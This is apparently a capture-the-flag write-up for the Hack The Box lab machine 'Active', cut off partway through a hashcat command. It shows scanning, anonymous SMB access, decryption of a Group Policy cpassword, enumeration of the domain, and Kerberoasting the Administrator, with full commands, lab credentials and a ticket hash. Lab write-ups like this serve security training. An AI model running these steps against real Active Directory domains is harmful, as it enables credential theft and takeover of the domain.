# [active](https://app.hackthebox.com/machines/active)

> A Windows Active Directory domain controller with an anonymously-accessible SMB share containing a Group Policy Preference XML document. This document contained a domain user's password that was encrypted with a publicly available key. With domain user credentials, a bit of domain enumeration revealed the domain administrator had a service principal name (SPN) set and thus was vulnerable to a Kerberoasting attack. Since the domain administrator's password is in the well-known word list rockyou.txt, the Kerberoasting attack was successful. The domain administrator's credential granted access to both the user and root flags on the domain controller.

---

## Open Port Enumeration

```bash
$ sudo masscan -p1-65535 10.129.250.15 --rate=1000 -e tun0 --output-format grepable --output-filename active.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-05 18:22:55 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat active.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,464,47001,49152,49153,49154,49155,49157,49158,49165,49170,49173,53,5722,593,636,88,9389,
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,3269,389,445,464,47001,49152,49153,49154,49155,49157,49158,49165,49170,49173,53,5722,593,636,88,9389 10.129.250.15 -oA active
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 14:30 EDT
Nmap scan report for 10.129.250.15
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-05 18:30:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device
Running (JUST GUESSING): Microsoft Windows 7|2008|8.1|Vista|Embedded Compact 7|10 (96%), Microsoft embedded (92%)
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_embedded_compact_7 cpe:/o:microsoft:windows_10 cpe:/h:microsoft:xbox_one
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (96%), Microsoft Server 2008 R2 SP1 (95%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (95%), Microsoft Windows Server 2008 SP1 (95%), Microsoft Windows Server 2008 SP2 (95%), Microsoft Windows 7 (95%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (95%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (95%), Microsoft Windows 7 Ultimate (95%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (95%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2021-11-05T18:31:34
|_  start_date: 2021-11-05T18:17:49
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.22 seconds
```

The ports 53, 88, 389, and 636 all indicate the target is a Windows Active Directory domain controller. The output from the LDAP ports seem to indicate the domain name is `active.htb`.

---

## SMB Enumeration

```bash
$ enum4linux -a 10.129.250.15
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov  5 14:39:06 2021

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.129.250.15
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.129.250.15    |
 =====================================================
[E] Can't find workgroup/domain


 =============================================
|    Nbtstat Information for 10.129.250.15    |
 =============================================
Looking up status of 10.129.250.15
No reply from 10.129.250.15

 ======================================
|    Session Check on 10.129.250.15    |
 ======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.129.250.15 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name:

 ============================================
|    Getting domain SID for 10.129.250.15    |
 ============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 10.129.250.15    |
 =======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.129.250.15 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.129.250.15 from srvinfo:
        10.129.250.15  Wk Sv PDC Tim NT     Domain Controller
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b

 ==============================
|    Users on 10.129.250.15    |
 ==============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ==========================================
|    Share Enumeration on 10.129.250.15    |
 ==========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.129.250.15
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.250.15/ADMIN$  Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.250.15/C$      Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.250.15/IPC$    Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.250.15/NETLOGON        Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.250.15/Replication     Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.250.15/SYSVOL  Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.250.15/Users   Mapping: DENIED, Listing: N/A

 =====================================================
|    Password Policy Information for 10.129.250.15    |
 =====================================================
[E] Unexpected error from polenum:


[+] Attaching to 10.129.250.15 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.250.15)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ===============================
|    Groups on 10.129.250.15    |
 ===============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.129.250.15 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ==============================================
|    Getting printer info for 10.129.250.15    |
 ==============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Nov  5 14:39:35 2021
```

There appears to be an SMB share `Replication` that is accessible anonymously. Recursively download the contents of the share.

```bash
$ smbget -R -U '' smb://10.129.250.15/Replication
Password for [] connecting to //Replication/10.129.250.15:
Using workgroup WORKGROUP, guest user
smb://10.129.250.15/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
smb://10.129.250.15/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
smb://10.129.250.15/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
smb://10.129.250.15/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
smb://10.129.250.15/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
smb://10.129.250.15/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
smb://10.129.250.15/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
Downloaded 8.11kB in 7 seconds
```

One of the files in the share, `active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`, is a Group Policy Preference XML document that contains passwords encrypted with a key that is publicly known.

```bash
$ cat Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The credential seems to be for the username `active.htb\SVC_TGS`. Decrypt the `cPassword` value.

```bash
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

`active.htb\SVC_TGS`'s password is `GPPstillStandingStrong2k18`.

---

## LDAP Enumeration

```bash
$ nmap -n -sV --script "ldap* and not brute" 10.129.250.15
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 14:56 EDT
Nmap scan report for 10.129.250.15
Host is up (0.047s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20211105185627.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=active,DC=htb
|       namingContexts: CN=Configuration,DC=active,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
|       defaultNamingContext: DC=active,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
|       rootDomainNamingContext: DC=active,DC=htb
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 98360
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: DC.active.htb
|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
Service Info: Host: DC; OS: Windows 2008 R2; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
```

The target's FQDN is `dc.active.htb`.

---

## Domain Enumeration

With `active.htb\SVC_TGS`'s credential, it is possible to enumerate the domain even further.

### Domain Users

```bash
$ pywerview get-netuser -w active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --dc-ip 10.129.250.15
accountexpires:                0
admincount:                    1
badpasswordtime:               2021-01-22 03:42:21.333537
badpwdcount:                   0
cn:                            Administrator
codepage:                      0
countrycode:                   0
description:                   Built-in account for administering the computer/domain
distinguishedname:             CN=Administrator,CN=Users,DC=active,DC=htb
dscorepropagationdata:         2018-07-18 20:34:35,
                               2018-07-18 20:14:54,
                               2018-07-18 19:05:45,
                               2018-07-18 19:05:45,
                               1601-01-01 00:00:00
homedirectory:
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-01-22 03:42:30.615553
lastlogontimestamp:            132557188237237831
logoncount:                    35
logonhours:                    [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:                      CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb,
                               CN=Domain Admins,CN=Users,DC=active,DC=htb,
                               CN=Enterprise Admins,CN=Users,DC=active,DC=htb,
                               CN=Schema Admins,CN=Users,DC=active,DC=htb,
                               CN=Administrators,CN=Builtin,DC=active,DC=htb
msds-supportedencryptiontypes: 0
name:                          Administrator
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    25ca718e-7312-467f-b'955a'-4c4f10963c1e
objectsid:                     S-1-5-21-405608879-3187717380-1996298813-500
primarygroupid:                513
profilepath:
pwdlastset:                    2018-07-18 15:06:40.351723
samaccountname:                Administrator
samaccounttype:                805306368
scriptpath:
serviceprincipalname:          active/CIFS:445
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:                    90145
usncreated:                    8196
whenchanged:                   2021-01-21 16:07:03
whencreated:                   2018-07-18 18:49:11

accountexpires:         9223372036854775807
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     Guest
codepage:               0
countrycode:            0
description:            Built-in account for guest access to the computer/domain
distinguishedname:      CN=Guest,CN=Users,DC=active,DC=htb
dscorepropagationdata:  1601-01-01 00:00:00
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=Guests,CN=Builtin,DC=active,DC=htb
name:                   Guest
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             128734a9-ff0e-4f5c-b'8c95'-a14738a11801
objectsid:              S-1-5-21-405608879-3187717380-1996298813-501
primarygroupid:         514
profilepath:
pwdlastset:             1600-12-31 19:03:58
samaccountname:         Guest
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['ACCOUNTDISABLE', 'PASSWD_NOTREQD', 'NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             8197
usncreated:             8197
whenchanged:            2018-07-18 18:49:11
whencreated:            2018-07-18 18:49:11

accountexpires:         9223372036854775807
admincount:             1
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     krbtgt
codepage:               0
countrycode:            0
description:            Key Distribution Center Service Account
distinguishedname:      CN=krbtgt,CN=Users,DC=active,DC=htb
dscorepropagationdata:  2018-07-18 19:05:45,
                        1601-01-01 00:00:00
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=active,DC=htb
name:                   krbtgt
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             43d7a1e7-a5a6-49ab-b'82d0'-e24e7472f88d
objectsid:              S-1-5-21-405608879-3187717380-1996298813-502
primarygroupid:         513
profilepath:
pwdlastset:             2018-07-18 14:50:36.972031
samaccountname:         krbtgt
samaccounttype:         805306368
scriptpath:
serviceprincipalname:   kadmin/changepw
showinadvancedviewonly: TRUE
useraccountcontrol:     ['ACCOUNTDISABLE', 'NORMAL_ACCOUNT']
usnchanged:             12739
usncreated:             12324
whenchanged:            2018-07-18 19:05:45
whencreated:            2018-07-18 18:50:35

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    SVC_TGS
codepage:              0
countrycode:           0
displayname:           SVC_TGS
distinguishedname:     CN=SVC_TGS,CN=Users,DC=active,DC=htb
dscorepropagationdata: 2018-07-18 20:14:38,
                       1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             2018-07-21 10:01:30.320277
lastlogontimestamp:    132806137280756089
logoncount:            6
name:                  SVC_TGS
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            8c9d3235-1d0a-4db1-b'99ee'-3f783d1a9bd6
objectsid:             S-1-5-21-405608879-3187717380-1996298813-1103
primarygroupid:        513
profilepath:
pwdlastset:            2018-07-18 16:14:38.402764
samaccountname:        SVC_TGS
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     SVC_TGS@active.htb
usnchanged:            98365
usncreated:            20508
whenchanged:           2021-11-05 19:22:08
whencreated:           2018-07-18 20:14:38
```

`SVC_TGS` appears to be the only nonstandard user account in the domain.

### Domain Groups

```bash
$ pywerview get-netgroup -w active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --dc-ip 10.129.250.15
samaccountname: Administrators
samaccountname: Users
samaccountname: Guests
samaccountname: Print Operators
samaccountname: Backup Operators
samaccountname: Replicator
samaccountname: Remote Desktop Users
samaccountname: Network Configuration Operators
samaccountname: Performance Monitor Users
samaccountname: Performance Log Users
samaccountname: Distributed COM Users
samaccountname: IIS_IUSRS
samaccountname: Cryptographic Operators
samaccountname: Event Log Readers
samaccountname: Certificate Service DCOM Access
samaccountname: Domain Computers
samaccountname: Domain Controllers
samaccountname: Schema Admins
samaccountname: Enterprise Admins
samaccountname: Cert Publishers
samaccountname: Domain Admins
samaccountname: Domain Users
samaccountname: Domain Guests
samaccountname: Group Policy Creator Owners
samaccountname: RAS and IAS Servers
samaccountname: Server Operators
samaccountname: Account Operators
samaccountname: Pre-Windows 2000 Compatible Access
samaccountname: Incoming Forest Trust Builders
samaccountname: Windows Authorization Access Group
samaccountname: Terminal Server License Servers
samaccountname: Allowed RODC Password Replication Group
samaccountname: Denied RODC Password Replication Group
samaccountname: Read-only Domain Controllers
samaccountname: Enterprise Read-only Domain Controllers
samaccountname: DnsAdmins
samaccountname: DnsUpdateProxy
```

`Replicator` appears to be the only nonstandard group in the domain.

### Domain Computers

```bash
$ pywerview get-netcomputer -w active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --dc-ip 10.129.250.15
dnshostname: DC.active.htb
```

Nothing except for the domain controller.

### Domain Graph

Graph the relationships in the domain using BloodHound.

```bash
$ bloodhound-python -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -c All -ns 10.129.250.15
INFO: Found AD domain: active.htb
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 4 users
INFO: Found 40 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 07S
```

According to BloodHound's `List All Kerberoastable Accounts` query, it appears the domain administrator, `active.htb\Administrator`, has at least one SPN set and thus is vulnerable to a Kerberoasting attack.

![](images/Pasted%20image%2020211106123444.png)

---

## Kerberoasting the Doman Administrator

Use `active.htb\SVC_TGS`'s credential to retrieve a service ticket for `active.htb\Administator`. This service ticket is encrypted with their password hash.

```bash
$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.250.171 -request-user Administrator
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-22 03:42:30.615553        



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c0d42b1422a9655ee6dc01a4f44eb735$6b061bdc09073b4e789f7cef99f90a9c99c8439672e666f4c30a15fcb0a18e1effb610a9e9096e52504259fc68d99deaaeeded770ea1ff38b41a5674a624e08ec0a4cd81635a9912e4504dcbf74ffb338e56d643a37d050a5a77c23ad66bc8a23f561a596c3de8956d6ce390466588ed2efb6bc34be1d2f1af318959d8f6b66f01add6438795f3bde37520e6a57e4fd441d98a7f62dfeafb4035bb3221b65d8f43dce07616d572522dd05926b29f844c1da56302b32943bf8e52f3372e8d35e13014eb44971fd2cd38b9df13e022cfb1feb1eac999969cd2d3d009748b1b22ee0ac247734300d74b038db51a82836be4557c85b2afbc7dba1b8e3252ce6ee9693bf8d49d843c27e3639586a4998cef971b3f62f69ac4dbf8e6c4c3d94903fb372a42349f79f3a65ff868c36bd75dfae3cf0645582a9041f50ae370b0544667d1a5c2689e3f4da76b352e90097c37dde688a746bf1d54d6f3aa4cbc7ade1d1b8a704b58205326643642da66443d3de272abc7597cfee34f83c614025cdd75103d63905d840ff4e44bd2ac82389b93587b3058a9472bc2559375e6b87c8a1acaf02afb3fa465bca0393905a07f18592d49faeab5344fdcbace9673fd28941f8a64399311acf66dd3e6587772e2e5885b98e0659650075d2d51f2229f5b4caf946da24b63fab615efa0cab35201036d8b5ee4cba4a4a2db0dc3725d3ac7b8d3955304644f01afd418364bc90b66e31ee4d32d5bbd782072cab7e965204e83feb73a769bc0491fd3e9099811ceebaadbd777a1267a0f8904a7a562224a4e28c84723789fce769cba7104ea0ddbd2a9d0cd5ead1cd3e54d8c3d4fd18f6e7df29f34694e3d86ea372c6e54fac4ed923df589bf6cb29c0cd48ca19dac4253e58671c9bd5a38c14a6730e0278db95f824d3084de2acde4ceb609c744aef6b53e88f2302ffc2d2be633d54e927c1292d17679993f635571b2c59dc3e6465a9eb96007ad120f2de57d967e54e9b0143dcbadb92135d8ef25b7de117aaae25f6c67ad6fc6dc2013154745e7d06f9da58343cf5cff4b46172f1ec18449c3e5b00748053a6bb8312c6e5d9d00cdbcc79e58810eb3df027c0f70bd70ce10e39106c89e855102392dae1cb223389c82dcef5bc2fb7e1b321f94450096b9512b5f350009e77f4b47a709807fe4515adb015744465460fb4ddc30b89f95e762f165182893fbca48b960c1056370760d8db21e5fe863c3c4c615202e146035dfec18b4
```

Attempt to crack the encrypted service ticket.

```bash
$ hashcat -m 13100 -a 0 '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c0d42b1422a9655ee6dc01a4f44eb735$6b061bdc09073b4e789f7cef99f90a9c99c8439672e666f4c30a15fcb0a18e1effb610a9e9096e52504259fc68d99deaaeeded770ea1ff38b41a5674a624e08ec0a4cd81635a9912e4504dcbf74ffb338e56d643a37d050a5a77c23ad66bc8a23f561a596c3de8956d6ce390466588ed2efb6bc34be1d2f1af318959d8f6b66f01add6438795f3bde37520e6a57e4fd441d98a7f62dfeafb4035bb3221b65d8f43dce07616d572522dd05926b29f844c1da56302b32943bf8e52f3372e8d35e13014eb44971fd2cd38b9df13e022cfb1feb1eac999969cd2d3d009748b1b22ee0ac247734300d74b038db51a82836be4557c85b2afbc7dba1b8e3252ce6ee9693bf8d49d843c27e3639586a4998cef971b3f62f69ac4dbf8e6c4c3d94903fb372a42349f79f3a65ff868c36bd75dfae3cf0645582a9041f50ae370b0544667d1a5c2689e3f4da76b352e90097c37dde688a746bf1d54d6f3aa4cbc7ade1d1b8a704b58205326643642da66443d3de272abc7597cfee34f83c614025cdd75103d63905d840ff4e44bd2ac82389b93587b3058a9472bc2559375e6b87c8a1acaf02afb3fa465bca0393905a07f18592d49faeab5344fdcbace9673fd28941f8a64399311acf66dd3e6587772e2e5885b98e0659650075d2d51f2229f5b4caf946da24b63fab615efa0cab35201036d8b5ee4cba4a4a2db0dc3725d3ac7b8d3955304644f01afd418364bc90b66e31ee4d32d5bbd782072cab7e965204e83fe